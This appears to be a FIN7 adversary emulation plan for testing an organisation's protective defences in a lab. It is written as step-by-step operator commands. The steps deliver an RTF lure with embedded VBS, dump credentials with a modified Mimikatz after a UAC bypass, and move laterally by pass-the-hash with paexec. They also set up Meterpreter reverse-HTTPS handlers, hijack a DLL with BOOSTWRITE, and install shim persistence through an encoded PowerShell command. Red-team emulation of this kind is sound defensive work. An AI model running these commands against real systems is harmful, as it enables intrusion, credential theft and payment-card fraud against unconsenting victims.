# Preface

For the purpose of this emulation plan, FIN7 operations have been separated into 2 scenarios (detections and protections), with steps and granular procedures contained within each. This division enables users to separately test detection and protection capabilities of their defenses. Within each scenario, operations have been broken into specific objectives, which are presented linearly.

While in Scenario 1 each objective enables subsequent objectives, Scenario 2 is designed such that each objective is run independently of any other. Specifically, this scenario is intended to be used in an environment that has protective/preventative defense measures enabled. That said, each organization can tailor this emulation to their individual use case, priorities, and available resources.

This emulation plan contains several placeholder values that are meant to be replaced with values specific to the target environment against which this plan is to be run. For ease of use, a script has been included to automatically make these substitutions, found [here](/fin7/Resources/placeholder_substitution).

---

# Scenario 2 Overview - Protections

* Emulation of FIN7 usage of tools such as SQLRat, BABYMETAL, BOOSTWRITE, and PILLOWMINT
* Scenario begins after delivery of a reverse shell payload distributed via spearphishing
* Targeted attack of a hospitality organization with the explicit goal of credit card theft
* Split into distinct steps that can be run independently of other steps
* Designed to assess protective/preventative defense measures

## Contents 

* [Step 1 - Initial Access with Embedded VBS in Word Document](#test-1---initial-access-with-embedded-vbs-in-word-document-evaluations-test-11)
* [Step 2 - UAC Bypass and Credential Dumping](#test-2---uac-bypass-and-credential-dumping-evaluations-test-12)
* [Step 3 - Lateral Movement via Pass-the-Hash](#test-3---lateral-movement-via-pass-the-hash-evaluations-test-13)
* [Step 4 - DLL Hijacking](#test-4---dll-hijacking-evaluations-test-14)
* [Step 5 - Shim Persistence](#test-5---shim-persistence-evaluations-test-15)

---

## Test 1 - Initial Access with Embedded VBS in Word Document (Evaluations Test 11)

The scenario begins with an initial breach where a legitimate user ([T1204](https://attack.mitre.org/techniques/T1204/)) opens an RTF document and double clicks text that says "Double Click Here to Unlock Contents". The RTF file contains an embedded Visual Basic payload ([T1027](https://attack.mitre.org/techniques/T1027/)). After double clicking the text block, `mshta.exe` executes ([T1170](https://attack.mitre.org/techniques/T1218/005/)) the Visual Basic payload([T1059](https://attack.mitre.org/techniques/T1059/005/)).
`mshta.exe` then assembles embedded text within the RTF file into a JavaScript payload. Next, `mshta.exe` makes a copy of the legitimate `wscript.exe` on disk as `Adb156.exe` ([T1036](https://attack.mitre.org/techniques/T1036/)). `winword.exe` spawns `verclsid.exe` ([T1175](https://attack.mitre.org/techniques/T1175/)). `mshta.exe` loads `taskschd.dll` and creates a scheduled task to execute in 5 minutes ([T1053](https://attack.mitre.org/techniques/T1053/)). The previously created scheduled task spawns `Adb156.exe` via svchost ([T1053.005](https://attack.mitre.org/techniques/T1053/005/)). 
`Adb156.exe` then loads `scrobj.dll` and executes [`sql-rat.js`](TODO-add-ref-to-src-code) via jscript([T1059.7](https://attack.mitre.org/techniques/T1059/007/)).
Next, `Adb156.exe` connects to 192.168.0.6 via MSSQL transactions ([T1071](https://attack.mitre.org/techniques/T1071)) (TCP port 1433). Finally, FIN7 performs WMI queries to obtain network configuration information ([T1016](https://attack.mitre.org/techniques/T1016/)) and system information ([T1082](https://attack.mitre.org/techniques/T1082/)).

This step consists of behaviors found in Step 1 of Scenario 1.

### Procedures

#### 1.A - Start C2 Server

On the `Windows Attack Platform`:

1. Open a CMD prompt
 
2. `cd` to the `c2fin7.exe` binary

2. Execute the following command
    ```
    [ATT&CK RAT]> .\c2fin7.exe -server 192.168.0.6
    ```

#### 1.B - User Execution: Malicious File (using Microsoft Word) ([T1204.002](https://attack.mitre.org/techniques/T1204/002/))

If testing with Microsoft Word, perform the following. If not, perform [Step 1.B*](#1b---user-execution-malicious-file-without-using-microsoft-word) instead.

On the `Linux Attack Platform`:

1. Copy `2-list.rtf` to `<domain_admin>`'s Desktop on `hotelmanager`.
    ```
    sudo smbclient -U '<domain_full>\<domain_admin>' //<hotelmanager_ip>/C$ -c "put fin7/Resources/Step1/2-list.rtf Users\\<domain_admin>.<domain>\\Desktop\\2-list.rtf"
    ```
   
    Provide `<domain_admin>`'s password when prompted:
    
    `<domain_admin_password>`

On `hotelmanager`:

1. Login to victim workstation as `<domain_admin>`
    ```
    xfreerdp +clipboard /u:"<domain_admin>@<domain_full>" /p:"<domain_admin_password>" /v:<hotelmanager_ip>
    ```

2. Double-click `2-list.rtf` located on `<domain_admin>`'s desktop

3. Decline any spurious prompts, including updating document with linked data

4. Double click the **text** that says "Double Click Here To Unlock Contents"

5. When prompted to run an `lnk` file, click "open"

6. Set a timer for 6 minutes - the scheduled task will fire 5 minutes after opening the lnk file on the minute so take 6 to be safe

#### 1.B* - User Execution: Malicious File (without using Microsoft Word)

Perform the following if you're testing without Office licenses:

On the `Linux Attack Platform`:

1. Upload `2-list.rtf`, `unprotectedNoWord.lnk`, and `obfuscated-payload.vbs` to `hotelmanager` as `2-list.rtf`, `2-list.lnk`, and `payload.vbs` respectively
    ```
    sudo smbclient -U '<domain_full>\<domain_admin>' //<hotelmanager_ip>/C$ -c "put fin7/Resources/Step1/SQLRat/2-list.rtf Users\\<domain_admin>.<domain>\\Desktop\\2-list.rtf; put /home/<attacker>/fin7/Resources/Step1/unprotectedNoWord.lnk Users\\<domain_admin>.<domain>\\Desktop\\2-list.lnk; put /home/<attacker>/fin7/Resources/Step1/obfuscated-payload.vbs Users\\<domain_admin>.<domain>\\AppData\\Local\\payload.vbs"
    ```
   
    Provide `<domain_admin>`'s password when prompted:
    
    `<domain_admin_password>`

On `hotelmanager`:

1. Login to victim workstation as `<domain_admin>`
    ```
    xfreerdp +clipboard /u:"<domain_admin>@<domain_full>" /p:"<domain_admin_password>" /v:<hotelmanager_ip>
    ```
   
2. Double-click `2-list.rtf` located on `<domain_admin>`'s desktop

3. Decline any spurious prompts, including updating document with linked data

4. Double click `2-list.lnk` on `<domain_admin>`'s Desktop

5. Set a timer for 6 minutes - the scheduled task will fire 5 minutes after opening the lnk file on the minute so take 6 to be safe

#### 1.C - SQLRat Execution via Scheduled Task ([T1053.005](https://attack.mitre.org/techniques/T1053/005/))

On the Windows `Attack Platform`:

1.  1. To verify that you have a new session on `hotelmanager` from your C2 server, run the following command to get the MAC of `hotelmanager`
    ```
    (ATT&CK Evals) > get-mac-serial
    ```

2. Delete scheduled the previously created scheduled task via SQLRat to prevent re-firing
    ```
    (ATT&CK Evals) > exec-cmd "schtasks.exe /Delete /TN \"Micriosoft Update Service\" /F"
    ```

3. Kill the existing session
    ```
    (ATT&CK Evals) > exec-cmd "taskkill /F /IM adb156.exe"
    ```
   
    The C2 server should repeatedly say "Waiting for response..." This indicates that the session was successfully terminated.
    
4. Close the C2 server
    ```
    (ATT&CK Evals) > exit
    ```
   
Close the RDP session to `hotelmanager`.

### Cited Intelligence
* FIN7 has created malicious DOCX and RTF lures that convince users to double-click on an image in the document. When a user double-clicks an image, an embedded malicious LNK file is spawned that launches mshta.exe, which executes a VBScript one-liner to decode a script hidden in the document. <sup>[4](https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/)</sup>

* FIN7 has copied wscript.exe into %LOCALAPPDATA% and renamed it. <sup>[3](https://labs.sentinelone.com/fin7-malware-chain-from-office-macro-malware-to-lightweight-js-loader/), [25](https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html)</sup>

* FIN7 has created scheduled tasks to establish persistence. <sup>[23](https://blog.morphisec.com/fin7-attacks-restaurant-industry), [4](https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/)</sup>

---

## Test 2 - UAC Bypass and Credential Dumping (Evaluations Test 12)

In this step, FIN7 uploads 2 files to `hotelmanager` ([T1105](https://attack.mitre.org/techniques/T1105/)). These are `samcat.exe`, a modified version of Mimikatz, and `uac-samcats.ps1`, a PowerShell [T1059.001](https://attack.mitre.org/techniques/T1059/001/) wrapper script that performs a UAC bypass [T1548.002](https://attack.mitre.org/techniques/T1548/002/) before executing `samcat.exe`. After uploading these files, FIN7 logs into `hotelmanager` [T1078.002](https://attack.mitre.org/techniques/T1078/002/) and executes `uac-samcats.ps1` to dump credentials [T1003.001](https://attack.mitre.org/techniques/T1003/001/) from an elevated user context.

This step consists of behaviors found in Step 5 of Scenario 1.

## 2A - UAC Bypass and Credential Dumping ([T1105](https://attack.mitre.org/techniques/T1105), [T1086](https://attack.mitre.org/techniques/T1086))

On the `Linux Attack Platform`:

1. Upload `samcat.exe` (modified Mimikatz) and `uac-samcats.ps1` (UAC Bypass script) to `hotelmanager` 
    ```
    sudo smbclient -U '<domain>\<domain_admin>' //<hotelmanager_ip>/C$ -c "put /home/<attacker>/fin7/Resources/Step5/samcat.exe Users\\<domain_admin>.<domain>\\AppData\\Local\\samcat.exe; put /home/<attacker>/fin7/Resources/Step5/uac-samcats.ps1 Users\\<domain_admin>.<domain>\\AppData\\Local\\uac-samcats.ps1"
    ```

    Provide `<domain_admin>`'s password when prompted:
    
    `<domain_admin_password>`
    
On `hotelmanager`:

1. RDP in as `<domain_admin>`
    ```
    xfreerdp +clipboard /u:<domain>\\<domain_admin> /p:"<domain_admin_password>" /v:<hotelmanager_ip>
    ```

2. Open a PowerShell window

2. Execute the `uac-samcats.ps1` PowerShell script
    ```
    powershell > C:\Users\<domain_admin>.<domain>\AppData\Local\uac-samcats.ps1
    ```
   
    Wait for the script to return. You should see credentials dumped to the screen.

3. After `uac-samcats.ps1` completes, close the RDP session on `Hotel Manager`

### Cited Intelligence
* FIN7 has used memory scrapers such as mimikatz to dump the passwords of logged on users. <sup>[9](https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf), [6](https://www.deepwatch.com/blog/profile-of-an-adversary-fin7/)</sup>

* The Carbanak malware has contained a UAC bypass. <sup>[10](https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s04-hello-carbanak.pdf)</sup>

---

## Test 3 - Lateral Movement via Pass-the-Hash (Evaluations Test 13)

Step 3 begins with FIN7 downloading `paexec.exe` and `hollow.exe` via powershell.exe ([T1105](https://attack.mitre.org/techniques/T1105/)) to `<domain_admin>`'s `AppData\Local\` directory on `hotelmanager`. Next, FIN7 uses a previously obtained password hash to perform a pass-the-hash attack ([T1550.002](https://attack.mitre.org/techniques/T1550/002/)) with `paexec.exe` ([T1021.002](https://attack.mitre.org/techniques/T1021/002)) in order to copy `hollow.exe` onto `itadmin` from `hotelmanager` as `<domain_admin>`. `paexec.exe` starts a temporary Windows service ([T1035](https://attack.mitre.org/techniques/T1569/002)) during the copying process called `PAExec-{PID}-{HOSTNAME}.exe` which executes `hollow.exe` ([T1021.002](https://attack.mitre.org/techniques/T1021/002)). `hollow.exe` spawns `svchost.exe` and unmaps its memory image ([T1055.012](https://attack.mitre.org/techniques/T1055/012)) to insert its payload. `svchost.exe` then exchanges data with 192.168.0.4 over HTTPS ([T1071.001](https://attack.mitre.org/techniques/T1071/001), [T1573.002](https://attack.mitre.org/techniques/T1573/002)).

This step consists of behaviors found in Step 6 of Scenario 1.

### Procedures

#### 3.A - Service Execution via Pass-the-Hash ([T1075](https://attack.mitre.org/techniques/T1075), [T1077](https://attack.mitre.org/techniques/T1077), [T1105](https://attack.mitre.org/techniques/T1105), [T1059](https://attack.mitre.org/techniques/T1059), [T1095](https://attack.mitre.org/techniques/T1095), [T1032](https://attack.mitre.org/techniques/T1032))

On the `Linux Attack Platform`:

1. Start `tmux` if it is not already started
    ```
    tmux
    ```

2. Start Metasploit
    ```
    sudo msfconsole
    ```

3. Setup a Meterpreter handler for `hollow.exe`
    ```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_https
    set lport 443
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```

4. Open a new `tmux` window
    ```
    Ctrl+b c
    ```

5. Upload `paexec.exe` and `hollow.exe` to `hotelmanager`
    ```
    sudo smbclient -U '<domain>\<domain_admin>' //<hotelmanager_ip>/C$ -c "put /home/<attacker>/fin7/Resources/Step6/paexec.exe Users\\<domain_admin>.<domain>\\AppData\\Local\\paexec.exe;put /home/<attacker>/fin7/Resources/Step6/hollow.exe Users\\<domain_admin>.<domain>\\AppData\\Local\\hollow.exe"
    ```
   
    Provide `<domain_admin>`'s password when prompted:
    
    `<domain_admin_password>`
    
6. Exit this `tmux` window to get back to the Metasploit window
    ```
    exit
    ```

On `hotelmanager`:

1. RDP into `hotelmanager` as `<domain_admin>`
    ```
    xfreerdp +clipboard /u:<domain>\\<domain_admin> /p:"<domain_admin_password>" /v:<hotelmanager_ip>
    ```

2. Open a `CMD` prompt

3. `cd` to the `AppData\Local` directory
    ```
    cmd > cd C:\\Users\\<domain_admin>.<domain>\\AppData\\Local
    ```

4. Use `paexec.exe` to perform pass-the-hash to execute `hollow.exe` on `itadmin`
    ```
    cmd > .\paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc ".\hollow.exe" hollow.exe
    ```
   
    You should receive a new Meterpreter session.

Back on the `Linux Attack Platform`:

1. Interact with the the newly created Meterpreter session 
    ```
    msf > sessions -i 1
    ```

2. Execute `getpid` to verify that the Meterpreter session is functional
    ```
    meterpreter > getpid
    ```

3. Exit Meterpreter session
    ```
    meterpreter > exit
    ```

4. Exit Metasploit
    ```
    msf > exit
    ```
   
5. Exit `tmux`
    ```
    exit
    ```
   
Close the RDP session to `hotelmanager`.

### Cited Intelligence
* FIN7 has used PAExec to execute remote commands and move laterally within an environment. <sup>[9](https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf), [6](https://www.deepwatch.com/blog/profile-of-an-adversary-fin7/)</sup>

* FIN7 has performed process injection to execute malicious payloads from memory. <sup>[19](https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-2/), [13](https://www.rsa.com/content/dam/en/white-paper/the-carbanak-fin7-syndicate.pdf)</sup>

---

## Test 4 - DLL Hijacking (Evaluations Test 14)

Step 4 focuses on emulating the DLL Hijacking and module execution functionality of BOOSTWRITE. This step starts by creating a BOOSTWRITE Meterpreter handler and staging a temporary Python HTTP server that returns the ASCII character "B" as an XOR decryption key. BOOSTWRITE.dll is then uploaded to `itadmin` as `C:\Windows\SysWOW64\srrstr.dll` ([T1105](https://attack.mitre.org/techniques/T1105/)). The `srrstr.dll` DLL is masquerading ([T1036.005](https://attack.mitre.org/techniques/T1036/005) as the legitimate `srrstrl.dll` found in `C:\Windows\System32`. Next, `cmd.exe` spawns from `svchost.exe`([T1059.003](https://attack.mitre.org/techniques/T1059/003))  to execute `SystemPropertiesAdvanced.exe`, which in turn loads and executes the malicious `srrstr.dll`([T1574](https://attack.mitre.org/techniques/T1574/001)). After `srrstr.dll` has been loaded and executed, `rundll32.exe` is spawned as a child process to communicate with the C2 server over HTTPS on port 8080 ([T1071](https://attack.mitre.org/techniques/T1071/001), [T1573](https://attack.mitre.org/techniques/T1573/002)) granting a new shell to the adversary.

This step consists of behaviors found in Step 7 of Scenario 1.

### Procedures

#### 4.A - Prepare BOOSTWRITE Handler

On the `Linux Attack Platform`:

1. Start `tmux` if it is not already started
    ```
    tmux
    ```

2. Start Metasploit
    ```
    sudo msfconsole
    ```

3. Setup a Meterpreter handler on 8080 for the BOOSTWRITE shell
    ```
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_https
    set LPORT 8080
    set LHOST 192.168.0.4
    set ExitOnSession false
    exploit -j
    ```
   
4. Open a new `tmux` window
    ```
    Ctrl+b c
    ```
   
5. Setup a `Python` HTTP server to host the XOR key needed by BOOSTWRITE
    ```
    echo "B" > /tmp/index.html; cd /tmp/; sudo python3 -m http.server 80
    ```
   
#### 4.B - DLL Search-Order Hijacking ([T1105](https://attack.mitre.org/techniques/T1105), [T1574.001](https://attack.mitre.org/techniques/T1574/001/))

On your `Ubuntu` machine:

1. RDP into `itadmin`
    ```
    xfreerdp +clipboard /u:<domain>\\<domain_admin> /p:"<domain_admin_password>" /v:<itadmin_ip>
    ```
   
On the `Linux Attack Platform`:

1. Open a new `tmux` window
    ```
    Ctrl+b c
    ```

2. Upload `BOOSTWRITE.dll` to `C:\Windows\Syswow64\` on `itadmin`
    ```
    sudo smbclient -U '<domain>\<domain_admin>' //<itadmin_ip>/C$ -c "put /home/<attacker>/fin7/Resources/Step7/BOOSTWRITE.dll Windows\\SysWOW64\\srrstr.dll"
    ```
   
    Provide `<domain_admin>`'s password when prompted:
    
    `<domain_admin_password>`
   
3. Exit current `tmux` window
    ```
    exit
    ```

On `itadmin`:

1. Open an administrator CMD prompt

2. Execute `SystemPropertiesAdvanced.exe` to perform the DLL Hijack
    ```
    cmd > C:\\Windows\\Syswow64\\SystemPropertiesAdvanced.exe"
    ```

    You should receive a new Meterpreter session on the `Linux Attack Platform`.
     
Back on the `Linux Attack Platform`:

1. Stop `Python` HTTP server
    ```
    Ctrl+c
    ```
   
2. Exit `Python` HTTP server `tmux` window
    ```
    exit
    ```

3. Interact with the newly created Meterpreter session
    ```
    msf > sessions -i 1
    ```
 
4. Execute `getpid` to verify that the Meterpreter session is functional
    ```
    meterpreter > getpid
    ```
   
    Sometimes it takes 1-2 minutes for the reflective DLL to register to the C2 server.

    If you execute `getpid` and receive no output, wait 30 seconds and try again.

5. Exit Meterpreter session
    ```
    meterpreter > exit
    ```

6. Exit Metasploit
    ```
    msf > exit
    ```

7. Exit `tmux` session
    ```
    exit
    ```
   
Close the RDP session to `itadmin`.

### Cited Intelligence
* BOOSTWRITE is a loader that has been launched via abuse of the DLL search order of applications which load legitimate services. This has included matching names of legitimate DLLs to force applications to import BOOSTWRITE DLLs instead of the legitimate DLLs.<sup>[2](https://www.fireeye.com/blog/threat-research/2019/10/mahalo-fin7-responding-to-new-tools-and-techniques.html)</sup>

---

## Test 5 - Shim Persistence (Evaluations Test 15)

Step 5 focuses on emulating persistence techniques. Adversary emulation begins with a valid logon to the accounting workstation as `<domain_admin>` ([T078](https://attack.mitre.org/techniques/T078/003)). After establishing an RDP session from `itadmin` to `accounting` over TCP port 3389 ([T1021](https://attack.mitre.org/T1021/001), [T1090](https://attack.mitre.org/1090)), FIN7 runs an encoded PowerShell command ([T1059](https://attack.mitre.org/T1059/001)). This PowerShell command downloads `dll329.dll` and `sdbE376.tmp` from the `Linux Attack Platform` ([T1105](https://attack.mitre.org/techniques/T1105/)), and then executes `sdbinst.exe` to install an application shim ([T1546.011](https://attack.mitre.org/techniques/T1546/011)) with the downloaded files.

This step consists of behaviors found in Steps 9 and 10 of Scenario 1.

### Procedures

#### 5.A - Setup Shim Persistence ([T1546.001](https://attack.mitre.org/techniques/T1546/011/))

On the `Linux Attack Platform`:

1. Start Metasploit
    ```
    sudo msfconsole
    ```

2. Start a Meterpreter handler on port 53
    ```
    msf > handler -p windows/meterpreter/reverse_https -H 192.168.0.4 -P 53
    ```

On `accounting`:

1. RDP into accounting
    ```
    xfreerdp +clipboard /u:<domain>\\<domain_admin> /p:"<domain_admin_password>" /v:<accounting_ip> /drive:X,<ubuntu_fin7_dir_abs_path>/Resources/Step9
    ```

2. Open an administrative PowerShell session

3. Execute the following Powershell command, which will install the application shim for persistence
    ```
    powershell > powershell -noprofile -encodedCommand "JABkAGwAbAAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAiAFwAXAB0AHMAYwBsAGkAZQBuAHQAXABYAFwAYgBpAG4AMwAyADkALgB0AG0AcAAiACAALQBFAG4AYwBvAGQAaQBuAGcAIABCAHkAdABlADsAIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAEQAUgBNAFwAIgAgAC0ATgBhAG0AZQAgACIANAAiACAAIAAtAFAAcgBvAHAAZQByAHQAeQBUAHkAcABlACAAQgBpAG4AYQByAHkAIAAtAFYAYQBsAHUAZQAgACQAZABsAGwAIAAtAEYAbwByAGMAZQA7ACAAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABkAGwAbAAzADIAOQAuAGQAbABsACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAIgAgAC0ARgBvAHIAYwBlADsAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcAAiACAALQBGAG8AcgBjAGUAOwAgACAAJgAgAHMAZABiAGkAbgBzAHQALgBlAHgAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgA7AA=="
    ```

#### 5.B - Execute Shim Persistence ([T1546.001](https://attack.mitre.org/techniques/T1546/011/))

1. Reboot `accounting`
    ```
    powershell > Restart-Computer -Force
    ```

2. Wait for `accounting` to start back up and then RDP in once again
    ```
    xfreerdp +clipboard /u:<domain>\\<domain_admin> /p:"<domain_admin_password>" /v:<accounting_ip>
    ```
   
   You should receive a new Meterpreter callback on the `Linux Attack Platform`.

On the `Linux Attack Platform`:

1. Interact with the new Meterpreter session
    ```
    msf > sessions -i 1 
    ```

2. Execute `getpid` to verify that the Meterpreter session is functional
    ```
    meterpreter > getpid
    ```

3. Exit Meterpreter session
    ```
    meterpreter > exit
    ```

4. Exit Metasploit
    ```
    msf > exit
    ```
   
Close the RDP session to `accounting`.

### Cited Intelligence
* The Carbanak malware is capable of performing network tunneling. <sup>[21](https://www.fireeye.com/blog/threat-research/2017/06/behind-the-carbanak-backdoor.html)</sup>

* FIN7 has utilized terminal services such as Remote Desktop Protocol (RDP) to move laterally within environments. <sup>[9](https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf)</sup>

* FIN7 has leveraged an application shim database registered using the sdbinst.exe utility to achieve persistence on systems in multiple environments. To install and register the malicious shim database, FIN7 has used custom Base64 encoded PowerShell scripts. <sup>[24](https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html)</sup>

* FIN7 has utilized application shimming to execute a payload stored within the registry. <sup>[24](https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html)</sup>

---

## Acknowledgements

---

- [Intelligence Summary](/fin7/Intelligence_Summary.md)
- [Operations Flow](/fin7/Operations_Flow.md)
- [Emulation Plan](/fin7/Emulation_Plan)
  - [Scenario 1 - Infrastructure](/fin7/Emulation_Plan/Scenario_1/Infrastructure.md)
  - [Scenario 1 - Detections](/fin7/Emulation_Plan/Scenario_1)
  - [Scenario 2 - Infrastructure](/fin7/Emulation_Plan/Scenario_2/Infrastructure.md)
  - [Scenario 2 - Protections](/fin7/Emulation_Plan/Scenario_2)
  - [YAML](/fin7/Emulation_Plan/yaml)
- [File Hashes](/fin7/hashes)
- [YARA Rules](/fin7/yara-rules)
- [Issues](/issues)
- [Change Log](/fin7/CHANGE_LOG.md)
